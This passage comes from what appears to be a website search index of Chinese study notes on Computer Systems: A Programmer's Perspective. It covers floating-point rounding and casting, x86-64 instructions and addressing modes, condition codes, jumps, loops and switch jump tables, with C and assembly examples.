(round-to-even)\u3002\u5176\u6839\u636e\u5728\u4e8e\uff0c\u5bf9\u4e8e\u4e00\u7ec4\u6d6e\u70b9\u6570\uff0c\u5982\u679c\u968f\u610f\u820d\u5165\u53ef\u80fd\u4f1a\u6539\u53d8\u5176\u5747\u503c\uff0c\u5411\u5076\u6570\u820d\u5165\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u907f\u514d\u4e86\u8fd9\u79cd\u7edf\u8ba1\u504f\u5dee\u3002 \u4f8b: $10.11100_2 \\approx 11.00_2$\uff0c $10.10100_2 \\approx 10.10_2$","title":"(2). \u820d\u5165"},{"location":"_csapp/1_Basis/1/#3_1","text":"\u4e0d\u540c\u4e8e\u8865\u7801\u8fd0\u7b97\uff0c\u7531\u4e8e\u9700\u8981\u8003\u8651\u820d\u5165 ($x+^f y=\\mathrm{Round}(x+y)$)\uff0c\u6d6e\u70b9\u8fd0\u7b97\u7f3a\u5c11\u4e00\u4e9b\u91cd\u8981\u7684\u7fa4\u5c5e\u6027: (\u4ee5 float \u4e3a\u4f8b) \u52a0\u6cd5\u4e0d\u53ef\u7ed3\u5408: (3.14 + 1e10) - 1e10 = 0 \uff0c\u5927\u503c\u4e0b\u7cbe\u5ea6\u53d8\u5c0f\uff0c\u53d1\u751f\u820d\u5165 \u4e58\u6cd5\u4e0d\u53ef\u7ed3\u5408: (1e20 * 1e20) * 1e-20 = +\u221e \uff0c\u8d8a\u754c\u6210\u4e3a\u65e0\u7a77 \u4e58\u6cd5\u4e0d\u53ef\u5206\u914d: 1e20 * (1e20 - 1e20) = 0.0, 1e20 * 1e20 - 1e20 * 1e20 = NaN \u5bf9\u4e8e\u6d6e\u70b9\u6570\uff0c\u5047\u5982\u7f16\u8bd1\u5668\u7ed9\u5b9a\u4e86 x = a + b + c; y = b + c + d\uff1b \u90a3\u4e48 t = b + c; x = a + t; y = t + d; \u5c31\u662f\u672a\u8003\u8651\u7ed3\u5408\u65b9\u5f0f\u7684\u9519\u8bef\u4f18\u5316\u3002","title":"(3). \u6d6e\u70b9\u8fd0\u7b97"},{"location":"_csapp/1_Basis/1/#4-c","text":"\u5f53 int \u3001 float \u3001 double \u4e4b\u95f4\u5f3a\u5236\u8f6c\u6362\u65f6\uff0c\u7a0b\u5e8f\u6539\u53d8\u6570\u503c\u7684\u539f\u5219: int \u2192 float :\u2002 \u4e0d\u4f1a\u6ea2\u51fa\uff0c\u7531\u4e8e float \u7cbe\u5ea6\u4f4e\u53ef\u80fd\u820d\u5165 int / float \u2192 double :\u2002 double \u7684\u8303\u56f4\u548c\u7cbe\u5ea6\u90fd\u66f4\u9ad8\uff0c\u80fd\u591f\u4fdd\u7559\u7cbe\u786e\u6570\u503c double \u2192 float :\u2002 \u503c\u53ef\u80fd\u6ea2\u51fa\u6210 $\\pm\\infty$\uff0c\u4e5f\u53ef\u80fd\u820d\u5165 float / double \u2192 int :\u2002 \u503c\u4f1a\u5411 0 \u820d\u5165\u3002\u4f8b\u5982\uff0c1.999 \u4f1a\u820d\u5165\u6210 1\uff0c\u56e0\u6b64\uff0c\u503c\u53ef\u80fd\u6ea2\u51fa \u5047\u8bbe\u53d8\u91cf x \uff0c f \u548c d \u5206\u522b\u662f int \uff0c float \u548c double \uff0c\u5b83\u4eec\u7684\u503c\u4efb\u610f\uff0c\u5224\u65ad\u4e0b\u5217\u8868\u8fbe\u5f0f\u662f\u5426\u4e3a\u771f A . x == ( int ) ( double ) x B . x == ( int ) ( float ) x C . d == ( double ) ( float ) d D . f == ( float ) ( double ) f E . 1.0 / 2 == 1 / 2.0 F . ( f + d ) - f == d A. \u771f; \u2003 B. \u5047\uff0c\u4f8b\u5982 x = MAX_INT ; \u2003C. \u5047\uff0c\u4f8b\u5982 d = 1e40 \uff0c\u53f3\u4fa7\u7b49\u4e8e\u6b63\u65e0\u7a77 D. \u771f\uff1b\u2003 E. \u771f\uff0c\u6267\u884c\u9664\u6cd5\u524d\uff0c\u5206\u5b50\u5206\u6bcd\u90fd\u4f1a\u8f6c\u6362\u6210\u6d6e\u70b9\uff1b\u2003 F. \u5047","title":"(4). C \u4e2d\u7684\u6d6e\u70b9\u6570"},{"location":"_csapp/1_Basis/2/","text":"$\\global\\def\\imm{\\mathit{Imm}}$ $\\global\\def\\r{\\mathrm{r}}$ $\\global\\def\\M{\\mathrm{M}}$ $\\global\\def\\R{\\mathrm{R}}$ $\\global\\def\\rsp{\\mathtt{\\%rsp}}$ 1. \u6570\u636e\u7c7b\u578b \ud83e\uddd0 (1). \u6570\u636e\u683c\u5f0f \ud83e\uddd0 \u7531\u4e8e Intel \u662f\u4ece 16 \u4f4d\u673a\u5668\u505a\u8d77\uff0c\u7528 \u5b57 (word) \u8868\u793a 16 bit \u6570\u636e\u7c7b\u578b\uff0c\u79f0 32 \u4f4d\u6570\u4e3a \u53cc\u5b57\uff0c\u79f0 64 \u4f4d\u6570\u4e3a\u56db\u5b57 (quad words)\u3002 C \u58f0\u660e Intel \u6570\u636e\u7c7b\u578b \u6c47\u7f16\u540e\u7f00 \u5b57\u8282 char byte b 1 short word w 2 int double words l 4 long quad words q 8 char* quad words q 8 float single precision s 4 double double precision l 8 \u540e\u7f00 l \u8868\u793a\u53cc\u5b57\u662f\u56e0\u4e3a 32 \u4f4d\u6570\u88ab\u770b\u6210\u957f\u5b57 (long word)\u3002\u7531\u4e8e\u6d6e\u70b9\u6570\u4f7f\u7528\u5b8c\u5168\u4e0d\u540c\u7684\u6307\u4ee4\u548c\u5bc4\u5b58\u5668\uff0c\u56e0\u6b64\u4e0d\u4f1a\u6709\u6b67\u4e49\u3002 (2). \u5bc4\u5b58\u5668 \ud83e\uddd0 x86-64 \u7684 cpu \u5305\u542b\u4e00\u7ec4 16 \u4e2a\u5b58\u50a8 64 \u4f4d\u503c\u7684\u901a\u7528\u5bc4\u5b58\u5668\u3002\u5411\u540e\u517c\u5bb9\u7684\u90e8\u5206\u662f\u7531\u4e8e\u4ece 8086 \u5230 IA32 \u518d\u5230 x86-64 \u7684\u6f14\u5316\uff0c %r8 - %r15 \u662f x86-64 \u540e\u65b0\u589e\u7684\u5bc4\u5b58\u5668\u3002 x86-64 registers \u5982\u679c\u6307\u4ee4\u5728\u5bc4\u5b58\u5668\u4e2d\u751f\u6210\u5c0f\u4e8e 8 byte \u7684\u7ed3\u679c: 1 \u5b57\u8282\u6216 2 \u5b57\u8282: \u4fdd\u6301\u5269\u4e0b\u7684\u4f4d\u4e0d\u53d8 4 \u5b57\u8282: \u628a\u9ad8\u4f4d 4 \u5b57\u8282\u7f6e 0\uff0c\u8fd9\u662f\u7531 IA32 \u5230 x86-64 \u6269\u5c55\u65f6\u91c7\u7528\u7684 2. \u57fa\u672c\u6307\u4ee4 \ud83e\uddd0 (1). \u64cd\u4f5c\u6570\u6307\u793a\u7b26 \ud83e\uddd0 Form Operand Value (s=1/2/4/8) Name $\\text{\\textdollar}\\mathit{Imm}$ $\\imm$ immediate $\\r_a$ $R[\\r_a ]$ register $\\imm$ $\\mathrm{M}[\\imm ]$ absolute $(\\r_a)$ $\\mathrm{M[R[\\r_a ]]}$ indirect $\\imm(\\r_b)$ $\\M[\\imm +\\R[\\r_b ]]$ Base + displacement $(\\r_b, \\r_i)$ $\\M[\\R[\\r_b ] +\\R[\\r_i ]]$ indexed $\\imm (\\r_b, \\r_i)$ $\\M[\\imm+ \\R[\\r_b ] +\\R[\\r_i ]]$ indexed $(,\\r_i, s)$ $ \\M[\\R[\\r_i ]\\cdot s]$ scaled indexed ... ... ... \u64cd\u4f5c\u6570\u683c\u5f0f\u6709\u4e09\u79cd: \u7acb\u5373\u6570 (immediate):\u2002 \u8868\u793a\u5e38\u6570\uff0c\u5728 ATT \u683c\u5f0f\u7528 $ \\text{\\textdollar}$ \u4f5c\u4e3a\u524d\u7f00\uff0c\u540e\u63a5\u4e00\u4e2a\u6807\u51c6 C \u8868\u793a\u6cd5\u7684\u6574\u6570 \u5bc4\u5b58\u5668 (register):\u2002 \u8868\u793a\u5bc4\u5b58\u5668\u4e2d\u7684\u5185\u5bb9\uff0c\u7528 $\\R[\\r ]$ \u5f15\u7528\u5176\u4e2d\u7684\u503c \u5185\u5b58\u5f15\u7528:\u2002 \u6839\u636e\u8ba1\u7b97\u51fa\u6765\u7684\u5730\u5740\u8bbf\u95ee\u67d0\u4e2a\u5185\u5b58\u4f4d\u7f6e\uff0c\u6709\u591a\u79cd\u5bfb\u5740\u65b9\u5f0f\uff0c\u57fa\u672c\u5f62\u5f0f\u4e3a $\\imm(\\r_b, \\r_i, s)$\uff0c\u5206\u522b\u8868\u793a\u7acb\u5373\u6570\u504f\u79fb\u3001\u57fa\u5740\u5bc4\u5b58\u5668\u3001\u53d8\u5740\u5bc4\u5b58\u5668\u548c\u6bd4\u4f8b\u56e0\u5b50\uff0c\u8ba1\u7b97\u4e3a $\\imm + \\R[\\r_b ] + \\R[\\r_i ] \\cdot s$ (2). \u6570\u636e\u4f20\u9001\u6307\u4ee4 \ud83e\uddd0 \u6700\u57fa\u672c\u7684\u4f20\u9001\u6307\u4ee4\u662f MOV \u7c7b: mov S, D \uff0c\u628a\u6e90\u6570\u636e\u590d\u5236\u5230\u76ee\u7684\u4f4d\u7f6e\u3002 movb , movw , movl , movq \uff0c\u6ce8\u610f movl \u4f1a\u628a\u5bc4\u5b58\u5668\u9ad8\u4f4d\u7f6e 0 movabsq I, R \u4ee5\u4efb\u610f\u56db\u5b57\u7684\u7acb\u5373\u6570\u4f5c\u4e3a\u6e90\uff0c\u4e14\u53ea\u80fd\u590d\u5236\u5230\u5bc4\u5b58\u5668 MOVZ \u548c MOVS \u7c7b\u628a\u8f83\u5c0f\u7684\u6e90\u590d\u5236\u5230\u8f83\u5927\u7684\u76ee\u7684\u5904\u5e76\u505a\u6269\u5c55\uff0c\u4e14\u76ee\u7684\u53ea\u80fd\u662f\u5bc4\u5b58\u5668\uff0c\u4f8b\u5982: movzbq : \u5c06\u505a\u4e86\u96f6\u6269\u5c55\u7684\u5b57\u8282\u4f20\u9001\u5230\u56db\u5b57 movswq : \u5c06\u505a\u4e86\u7b26\u53f7\u6269\u5c55\u7684\u5b57\u4f20\u9001\u5230\u56db\u5b57 cltq : \u628a %eax \u7b26\u53f7\u6269\u5c55\u5230 %rax \u7531\u4e8e 4 \u5b57\u8282\u4f20\u9001\u9ad8\u4f4d\u6e05 0 \u7684\u7279\u6027\uff0c movzlq \u5e76\u6ca1\u6709\u5fc5\u8981\u5b58\u5728 (3). \u6808\u64cd\u4f5c \ud83e\uddd0 x86-64 \u4e2d\uff0c\u6808\u653e\u5728\u5185\u5b58\u7684\u67d0\u4e2a\u533a\u57df\uff0c\u6808\u9876\u5728\u4f4e\u5730\u5740\u65b9\u5411 instructions effect equiv instr pushq S $\\R[\\rsp ] \\leftarrow\\R[\\rsp ] - 8$ $\\M[\\R[ \\rsp]] \\leftarrow S$ subq $8, %rsp movq S, (%rsp) popq D $D \\leftarrow \\M[ \\R[ \\rsp]]$ $\\R[\\rsp ] \\leftarrow \\R[\\rsp ] + 8$ movq (%rsp), D addq $8, %rsp 3. \u7b97\u672f\u548c\u903b\u8f91\u6307\u4ee4 \ud83e\uddd0 (1). \u57fa\u672c\u6574\u6570\u7b97\u672f\u6307\u4ee4 \ud83e\uddd0 \u4e00\u5143\u64cd\u4f5c: INC D \u2003 DEC D \u2003 NEG D \u2003 NOT D \u2003 \u4e8c\u5143\u64cd\u4f5c: D \u65e2\u4f5c\u4e3a\u6e90\u53c8\u4f5c\u4e3a\u76ee\u7684 $(\\small\\mathrm{D\\ \\leftarrow D\\ \\mathsf{op}\\ S})$ ADD S, D \u2003 SUB S, D \u2003 IMUL S, D \u2003 XOR S, D \u2003 OR S, D \u2003 AND S, D \u79fb\u4f4d\u64cd\u4f5c: $(\\small\\mathrm{D\\ \\leftarrow D\\ \\mathsf{op}\\ }k)$\uff0c\u5f53 $k$ \u662f\u4e00\u4e2a\u5355\u5b57\u8282\u5bc4\u5b58\u5668\u65f6\uff0c\u79fb\u4f4d\u503c\u4e3a\u5bc4\u5b58\u5668\u7684\u4f4e $m$ \u4f4d $(2^m = \\mathit{bits})$\u3002\u4f8b\u5982\uff0c\u5f53 $\\R[ \\mathtt{\\%cl}]=\\text{0xff}$\uff0c sall \u4f1a\u79fb 31 \u4f4d SAL k, D \u2003 SHL k, D \u2003 \u5de6\u79fb\u64cd\u4f5c SAR k, D \u2003 SHR k, D \u2003 \u7b97\u672f\u53f3\u79fb \u548c \u903b\u8f91\u53f3\u79fb (2). \u52a0\u8f7d\u6709\u6548\u5730\u5740 \ud83e\uddd0 \u6307\u4ee4 leaq S, D (load effective address) \u76ee\u7684\u53ea\u80fd\u662f\u5bc4\u5b58\u5668\uff0c\u6e90\u53ea\u80fd\u662f\u5185\u5b58\u5f15\u7528\u4e14\u83b7\u5f97\u7684\u503c\u662f\u5730\u5740\u3002\u5b83\u9664\u4e86\u53ef\u4ee5\u4ea7\u751f\u6307\u9488\u4ee5\u5916\uff0c\u8fd8\u80fd\u7528\u4e8e\u52a0\u6cd5\u548c\u6709\u9650\u7684\u4e58\u6cd5\u8fd0\u7b97\u3002 other usage of leaq \u7ed9\u5b9a C \u7a0b\u5e8f: long scale ( long x , long y , long z ) { long t = x + 4 * y + 12 * z ; return t ; } \u7531 gcc -Og -S _.c \u5f97\u5230: scale: leaq ( %rdi , %rsi , 4 ), %rax ; x + 4 * y leaq ( %rdx , %rdx , 2 ), %rdx ; z + 2 * z leaq ( %rax , %rdx , 4 ), %rax ; (x + 4 * y) + 4 * (3 * z) ret 4. \u63a7\u5236\u6307\u4ee4 \ud83e\uddd0 (1). \u6761\u4ef6\u7801 \ud83e\uddd0 cpu \u7ef4\u62a4\u4e00\u7ec4\u5355\u6bd4\u7279\u7684 \u6761\u4ef6\u7801\u5bc4\u5b58\u5668\uff0c\u5b83\u4eec\u63cf\u8ff0\u4e86\u6700\u8fd1\u7684\u7b97\u672f\u64cd\u4f5c\u7684\u5c5e\u6027\uff0c\u5e38\u7528\u7684\u6709: CF: \u8fdb\u4f4d\u6807\u5fd7\uff1b\u6700\u8fd1\u7684\u64cd\u4f5c\u4f7f\u6700\u9ad8\u4f4d\u4ea7\u751f\u4e86\u8fdb\u4f4d\uff0c\u53ef\u68c0\u6d4b\u6709\u7b26\u53f7\u6570\u7684\u6ea2\u51fa ZF: \u96f6\u6807\u5fd7\uff1b\u6700\u8fd1\u7684\u64cd\u4f5c\u5f97\u5230\u7ed3\u679c 0 SF: \u7b26\u53f7\u6807\u5fd7\uff1b\u6700\u8fd1\u7684\u64cd\u4f5c\u5f97\u5230\u8d1f\u6570 OF: \u6ea2\u51fa\u6807\u5fd7\uff1b\u6700\u8fd1\u7684\u64cd\u4f5c\u5bfc\u81f4\u8865\u7801\u6b63\u6ea2\u51fa\u6216\u8d1f\u6ea2\u51fa \u9664\u4e86 leaq \u7684\u6240\u6709\u4e0a\u8ff0\u7b97\u672f\u6307\u4ee4\u90fd\u4f1a\u8bbe\u7f6e\u6761\u4ef6\u7801\uff0c\u4f8b\u5982\uff0cXOR \u4f1a\u628a\u8fdb\u4f4d\u548c\u6ea2\u51fa\u6807\u5fd7\u8bbe\u4e3a 0\u3002 (2). CMP & TEST \ud83e\uddd0 instruction base on desciption CMP S1, S2 S2 - S1 \u6bd4\u8f83 TEST S1, S2 S1 & S2 \u6d4b\u8bd5 CMP / TEST \u548c SUB / AND \u7684\u533a\u522b\u5728\u4e8e\u53ea\u8bbe\u6761\u4ef6\u7801\u4e0d\u66f4\u65b0\u5bc4\u5b58\u5668 testq %rax, %rax \u53ef\u4ee5\u68c0\u6d4b %rax \u662f\u5426\u4e3a\u6b63\u8d1f\u96f6 (ZF\u3001SF)\uff0c TEST \u6307\u4ee4\u8fd8\u53ef\u7528\u4e8e\u63a9\u7801\u6d4b\u8bd5 (3). SET \ud83e\uddd0 SET \u6307\u4ee4\u7684\u64cd\u4f5c\u6570\u662f\u4f4e\u4f4d\u5355\u5b57\u8282\u5bc4\u5b58\u5668\u6216\u5355\u5b57\u8282\u5185\u5b58\uff0c\u7136\u540e\u5c06\u8fd9\u4e2a\u4f4d\u7f6e\u8bbe\u4e3a 0 \u6216 1\u3002\u5e38\u7528\u7684\u6709: instruction synonym effect condition sete D setz D \u2190 ZF equal setl D setnge D \u2190 SF ^ OF less (signed) setb D setnae D \u2190 CF below (unsigned) ... ... ... ... \u4e00\u6bb5\u8ba1\u7b97 a < b \u7684\u5178\u578b\u6307\u4ee4\u5e8f\u5217: ;a in %rdi, b in %rsi comp: cmpq %rsi , %rdi ;compare a:b setl %al ;set low-order byte of %eax to 0 or 1 movzbl %al , %eax ;clear rest of %eax (and %rax) ret \u4ee5 setl \u4e3a\u4f8b\uff0c\u5f53 a-b \u8d1f\u6ea2\u51fa\u4e14 a<b \uff0cSF=0 \u4e14 OF=1\uff1b\u5c06\u6240\u6709\u60c5\u51b5\u7ec4\u5408\u5373\u5f97\u5230\u4e86 SF ^ OF (4). \u8df3\u8f6c\u6307\u4ee4 \ud83e\uddd0 \u8df3\u8f6c\u4f4d\u7f6e\u901a\u5e38\u9700\u8981\u4e00\u4e2a Label \u6807\u660e\uff1b jmp \u7684\u95f4\u63a5\u8df3\u8f6c\u901a\u8fc7\u64cd\u4f5c\u6570\u6307\u5b9a instruction synonym condition description jmp Label 1 direct jmp *Operand ` indirect je Label jz ZF equal / zero jne Label jnz ~ZF not equal / zero jg Label jnle ~(SF ^ OF) & ~ZF greater (signed) ... ... ... ... \u8df3\u8f6c\u6307\u4ee4\u6709\u51e0\u79cd\u4e0d\u540c\u7684\u7f16\u7801\uff0c\u6700\u5e38\u7528\u7684\u662f PC-relative: branch.s\u2003 movq %rdi , %rax jmp .L2 .L3: sarq %rax .L2: testq %rax , %rax jg .L3 rep ret disas from branch.o\u2003 0: 48 89 f8 mov %rdi , %rax 3: eb 03 jmp 8 < loop + 0x8 > 5: 48 d1 f8 sar %rax 8: 48 85 c0 test %rax , %rax b: 7 f f8 jg 5 < loop + 0x5 > d: f3 c3 repz retq \u53cd\u6c47\u7f16\u6587\u4ef6\u7684\u7b2c\u4e00\u6761\u8df3\u8f6c\u5730\u5740\u7684\u7f16\u7801\u4e3a 0x03 (signed)\uff0c\u52a0\u4e0a\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740 0x5 (PC \u7684\u503c)\uff0c\u5f97\u5230\u76ee\u6807\u5730\u5740 0x8 (\u7531\u4e8e\u5386\u53f2\u539f\u56e0\uff0c\u66f4\u65b0 PC \u5728\u6267\u884c\u6307\u4ee4\u524d\u8fdb\u884c)\u3002\u8fd9\u79cd\u65b9\u5f0f\u4f7f\u5f97\u6307\u4ee4\u7f16\u7801\u5f88\u7b80\u6d01\u3002 5. \u57fa\u672c\u8bed\u53e5 \ud83e\uddd0 (1). \u6761\u4ef6\u5206\u652f \ud83e\uddd0 \u6761\u4ef6\u8bed\u53e5\u5728\u6c47\u7f16\u4e2d\u901a\u5e38\u4f1a\u7ffb\u8bd1\u4e3a if false \u7684\u5f62\u5f0f\uff0c\u4f8b\u5982 if-else : if-else original if ( < test - expr > ) < then - stmt > else < else - stmt > assembly t = < exp > ; if ( ! t ) goto false ; < then - stmt > goto done ; false : < else - stmt > done : \u73b0\u4ee3\u5904\u7406\u5668\u901a\u8fc7 pipeline \u83b7\u5f97\u9ad8\u6027\u80fd\uff0c\u800c\u901a\u8fc7\u57fa\u672c\u7684\u6761\u4ef6\u5206\u652f\u5b9e\u73b0\u6761\u4ef6\u8bed\u53e5\uff0c\u7531\u4e8e\u5206\u652f\u9884\u6d4b\u53ef\u80fd\u51fa\u9519\uff0c\u53ef\u80fd\u4f1a\u4f4e\u6548\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7\u6761\u4ef6\u4f20\u9001\u6307\u4ee4\u907f\u514d\u3002 original C code long absdiff ( long x , long y ) { long result ; if ( x < y ) result = y - x ; else result = x - y ; return result ; } format as conditional move long cmovdiff ( long x , long y ) { long rval = y - x ; long eval = x - y ; long ntest = x >= y ; /* Line below requires single instruction */ if ( ntest ) rval = eval ; return rval ; } assembly code ;x in %rdi, y in %rsi absdiff: movq %rsi , %rax subq %rdi , %rax ;rval = y - x movq %rdi , %rdx subq %rsi , %rdx ;eval = x - y cmpq %rsi , %rdi ;compare x:y cmovge %rdx , %rax ;if >=, rval = eval ret \u6761\u4ef6\u4f20\u9001\u5e76\u4e0d\u9002\u7528\u4e8e\u6240\u6709\u60c5\u51b5\uff0c\u5982: \u5f53 then-expr \u6216 else-expr \u9700\u8981\u5927\u91cf\u7684\u8ba1\u7b97 \u5bf9\u4e8e\u6307\u9488 xp \uff0c\u6761\u4ef6\u4f20\u9001\u4f1a\u6539\u53d8 (xp ? *xp : 0) \u7684\u6267\u884c\u903b\u8f91 (2). \u5faa\u73af \ud83e\uddd0 \u5faa\u73af\u901a\u5e38\u7ffb\u8bd1\u4e3a\u5982\u4e0b\u5f62\u5f0f: loop do-while loop : < body - stmt > ; t = < exp > ; if ( t ) goto loop ; while (jump to mid) goto test ; loop : < body - stmt > ; test : t = < exp > ; if ( t ) goto loop ; while (guarded-do) t = < exp > ; if ( ! t ) goto done ; loop : < body - stmt > ; t = < exp > ; if ( t ) goto loop ; done : gcc -O1 \u901a\u5e38\u91c7\u7528 \"guraded-do\" \u7684\u5f62\u5f0f\u7ffb\u8bd1 while \u5faa\u73af: \u5224\u65ad\u521d\u59cb\u6761\u4ef6\uff0c\u5e76\u628a\u5269\u4e0b\u7684\u90e8\u5206\u8f6c\u6362\u4e3a do-while \u7684\u5f62\u5f0f\uff1b\u7528\u8fd9\u79cd\u7b56\u7565\u65b9\u4fbf\u7f16\u8bd1\u5668\u4f18\u5316\u6761\u4ef6\u8868\u8fbe\u5f0f\u3002 (3). switch \ud83e\uddd0 \u5f53\u5f00\u5173\u6570\u91cf\u8f83\u591a\u4e14\u5f00\u5173\u8de8\u5ea6\u8f83\u5c0f\u65f6\uff0cgcc \u4f1a\u4f7f\u7528\u8df3\u8f6c\u8868\u4f18\u5316\u7a0b\u5e8f\uff0c\u5176\u4f18\u70b9\u5728\u4e8e\u51cf\u5c11\u5206\u652f\u5224\u65ad\u7684\u65f6\u95f4\u3002 example original C code void switchEg ( long x , long n , long * dest ) { long val = x ; switch ( n ) { case 100 : val *= 13 ; break ; case 102 : val += 10 ; /* Fall through */ case 103 : val += 11 ; break ; case 104 : case 106 : val *= val ; break ; default : val = 0 ; } * dest = val ; } extending rep by gcc void switchEgImpl ( long x , long n , long * dest ) { /* Table of code pointers */ static void * jt [ 7 ] = { && loc_A , && loc_def , && loc_B , && loc_C , && loc_D , && loc_def , && loc_D }; unsigned long index = n - 100 ; long val ; if ( index > 6 ) goto loc_def ; /* Multiway branch */ goto * jt [ index ]; loc_A : /* Case 100 */ val = x * 13 ; goto done ; loc_B : /* Case 102 */ x = x + 10 ; /* Fall through */ loc_C : /* Case 103 */ val = x + 11 ; goto done ; loc_D : /* Cases 104, 106 */ val = x * x ; goto done ; loc_def : /* Default case */ val = 0 ; done : * dest = val ; } assembly ;void switch_eg(long x, long n, long *dest) ;x in %rdi, n in %rsi, dest in %rdx switch_eg: subq $100 , %rsi ;Compute index = n-100 cmpq $6 , %rsi ;Compare index:6 ja .L8 ;If >, goto loc_def jmp *. L4 (, %rsi , 8 ) Goto * jg [ index ] .L3: ;loc_A: leaq ( %rdi , %rdi , 2 ), %rax ;3*x leaq ( %rdi , %rax , 4 ), %rdi ;val = 13*x jmp .L2 ;Goto done .L5: ;loc_B: addq $10 , %rdi ;x = x + 10 .L6: ;loc_C: addq $11 , %rdi ;val = x + 11 jmp .L2 ;Goto done .L7: ;loc_D: imulq %rdi , %rdi ;val = x * x jmp .L2 ;Goto done .L8: ;loc_def: movl $0 , %edi ;val = 0 .L2: ;done: movq %rdi , ( %rdx ) ;*dest = val ret ;Return .rodata .section .rodata .align 8 .L4: .quad .L3 .quad .L8 .quad .L5 .quad .L6 .quad .L7 .quad .L8 .quad .L7 switchEgImpl \u662f\u5bf9\u8df3\u8f6c\u8868\u7684 C \u8bed\u8a00\u5b9e\u73b0\uff0c\u5176\u4e2d\u7528\u5230\u4e86 gcc \u5bf9 C \u7684\u6269\u5c55\u8bed\u6cd5\u3002\u9996\u5148\u628a n \u538b\u7f29\u5230 0-6 \u8303\u56f4\u5185\uff0c\u5e76\u89c6\u5176\u4e3a\u65e0\u7b26\u53f7\u6570\uff1b\u7136\u540e\u6784\u9020\u8df3\u8f6c\u8868\uff0c\u5bf9\u7f3a\u5931\u9879\u4f7f\u7528\u9ed8\u8ba4\u6807\u53f7 loc_def \u3002","title":"2. instructions"},{"location":"_csapp/1_Basis/2/#1","text":"","title":"1. \u6570\u636e\u7c7b\u578b"},{"location":"_csapp/1_Basis/2/#1_1","text":"\u7531\u4e8e Intel \u662f\u4ece 16 \u4f4d\u673a\u5668\u505a\u8d77\uff0c\u7528 \u5b57 (word) \u8868\u793a 16 bit \u6570\u636e\u7c7b\u578b\uff0c\u79f0 32 \u4f4d\u6570\u4e3a \u53cc\u5b57\uff0c\u79f0 64 \u4f4d\u6570\u4e3a\u56db\u5b57 (quad words)\u3002 C \u58f0\u660e Intel \u6570\u636e\u7c7b\u578b \u6c47\u7f16\u540e\u7f00 \u5b57\u8282 char byte b 1 short word w 2 int double words l 4 long quad words q 8 char* quad words q 8 float single precision s 4 double double precision l 8 \u540e\u7f00 l \u8868\u793a\u53cc\u5b57\u662f\u56e0\u4e3a 32 \u4f4d\u6570\u88ab\u770b\u6210\u957f\u5b57 (long word)\u3002\u7531\u4e8e\u6d6e\u70b9\u6570\u4f7f\u7528\u5b8c\u5168\u4e0d\u540c\u7684\u6307\u4ee4\u548c\u5bc4\u5b58\u5668\uff0c\u56e0\u6b64\u4e0d\u4f1a\u6709\u6b67\u4e49\u3002","title":"(1). \u6570\u636e\u683c\u5f0f"},{"location":"_csapp/1_Basis/2/#2","text":"x86-64 \u7684 cpu \u5305\u542b\u4e00\u7ec4 16 \u4e2a\u5b58\u50a8 64 \u4f4d\u503c\u7684\u901a\u7528\u5bc4\u5b58\u5668\u3002\u5411\u540e\u517c\u5bb9\u7684\u90e8\u5206\u662f\u7531\u4e8e\u4ece 8086 \u5230 IA32 \u518d\u5230 x86-64 \u7684\u6f14\u5316\uff0c %r8 - %r15 \u662f x86-64 \u540e\u65b0\u589e\u7684\u5bc4\u5b58\u5668\u3002 x86-64 registers \u5982\u679c\u6307\u4ee4\u5728\u5bc4\u5b58\u5668\u4e2d\u751f\u6210\u5c0f\u4e8e 8 byte \u7684\u7ed3\u679c: 1 \u5b57\u8282\u6216 2 \u5b57\u8282: \u4fdd\u6301\u5269\u4e0b\u7684\u4f4d\u4e0d\u53d8 4 \u5b57\u8282: \u628a\u9ad8\u4f4d 4 \u5b57\u8282\u7f6e 0\uff0c\u8fd9\u662f\u7531 IA32 \u5230 x86-64 \u6269\u5c55\u65f6\u91c7\u7528\u7684","title":"(2). \u5bc4\u5b58\u5668"},{"location":"_csapp/1_Basis/2/#2_1","text":"","title":"2. \u57fa\u672c\u6307\u4ee4"},{"location":"_csapp/1_Basis/2/#1_2","text":"Form Operand Value (s=1/2/4/8) Name $\\text{\\textdollar}\\mathit{Imm}$ $\\imm$ immediate $\\r_a$ $R[\\r_a ]$ register $\\imm$ $\\mathrm{M}[\\imm ]$ absolute $(\\r_a)$ $\\mathrm{M[R[\\r_a ]]}$ indirect $\\imm(\\r_b)$ $\\M[\\imm +\\R[\\r_b ]]$ Base + displacement $(\\r_b, \\r_i)$ $\\M[\\R[\\r_b ] +\\R[\\r_i ]]$ indexed $\\imm (\\r_b, \\r_i)$ $\\M[\\imm+ \\R[\\r_b ] +\\R[\\r_i ]]$ indexed $(,\\r_i, s)$ $ \\M[\\R[\\r_i ]\\cdot s]$ scaled indexed ... ... ... \u64cd\u4f5c\u6570\u683c\u5f0f\u6709\u4e09\u79cd: \u7acb\u5373\u6570 (immediate):\u2002 \u8868\u793a\u5e38\u6570\uff0c\u5728 ATT \u683c\u5f0f\u7528 $ \\text{\\textdollar}$ \u4f5c\u4e3a\u524d\u7f00\uff0c\u540e\u63a5\u4e00\u4e2a\u6807\u51c6 C \u8868\u793a\u6cd5\u7684\u6574\u6570 \u5bc4\u5b58\u5668 (register):\u2002 \u8868\u793a\u5bc4\u5b58\u5668\u4e2d\u7684\u5185\u5bb9\uff0c\u7528 $\\R[\\r ]$ \u5f15\u7528\u5176\u4e2d\u7684\u503c \u5185\u5b58\u5f15\u7528:\u2002 \u6839\u636e\u8ba1\u7b97\u51fa\u6765\u7684\u5730\u5740\u8bbf\u95ee\u67d0\u4e2a\u5185\u5b58\u4f4d\u7f6e\uff0c\u6709\u591a\u79cd\u5bfb\u5740\u65b9\u5f0f\uff0c\u57fa\u672c\u5f62\u5f0f\u4e3a $\\imm(\\r_b, \\r_i, s)$\uff0c\u5206\u522b\u8868\u793a\u7acb\u5373\u6570\u504f\u79fb\u3001\u57fa\u5740\u5bc4\u5b58\u5668\u3001\u53d8\u5740\u5bc4\u5b58\u5668\u548c\u6bd4\u4f8b\u56e0\u5b50\uff0c\u8ba1\u7b97\u4e3a $\\imm + \\R[\\r_b ] + \\R[\\r_i ] \\cdot s$","title":"(1). \u64cd\u4f5c\u6570\u6307\u793a\u7b26"},{"location":"_csapp/1_Basis/2/#2_2","text":"\u6700\u57fa\u672c\u7684\u4f20\u9001\u6307\u4ee4\u662f MOV \u7c7b: mov S, D \uff0c\u628a\u6e90\u6570\u636e\u590d\u5236\u5230\u76ee\u7684\u4f4d\u7f6e\u3002 movb , 